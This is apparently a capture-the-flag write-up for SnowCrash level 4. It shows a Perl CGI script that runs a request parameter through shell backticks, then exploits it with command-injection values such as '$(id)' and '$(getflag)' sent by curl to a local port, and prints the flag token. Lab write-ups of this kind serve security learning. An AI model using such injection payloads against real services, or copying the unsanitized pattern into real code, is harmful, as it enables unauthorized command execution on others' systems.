# Level04

This time we have a perl script ran as flag04.

	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
	  $y = $_[0];
	  print `echo $y 2>&1`;
	}
	x(param("x"));

So the script would print the value of the parameter "x" passed as argument to stdin.
There is no input validation so we can try to send some commands : 

	level04@SnowCrash:~$ ./level04.pl 'x=$(id)'
	Content-type: text/html
	
	uid=2004(level04) gid=2004(level04) groups=2004(level04),100(users)

We are still executing as level04 and not flag04 so we can't run getflag.
However, we can see on the second line of the program that it could be run by a server.

	level05@SnowCrash:~$ netstat -tunl
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State
	tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN
	tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN
	tcp6       0      0 :::4646                 :::*                    LISTEN
	tcp6       0      0 :::4747                 :::*                    LISTEN
	tcp6       0      0 :::80                   :::*                    LISTEN
	tcp6       0      0 :::4242                 :::*                    LISTEN
	udp        0      0 0.0.0.0:68              0.0.0.0:*

There is indeed a process listening on port 4747. If we try to connect to it using nc :

	level04@SnowCrash:~$ nc localhost 4747
	x=test
	
	level04@SnowCrash:~$ nc localhost 4747
	x=$(id)

Not much going on. If we send a GET request using curl instead : 

	level04@SnowCrash:~$ curl 'localhost:4747/?x=$(id)'
	uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
	
	level04@SnowCrash:~$ curl 'localhost:4747/?x=$(getflag)'
	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
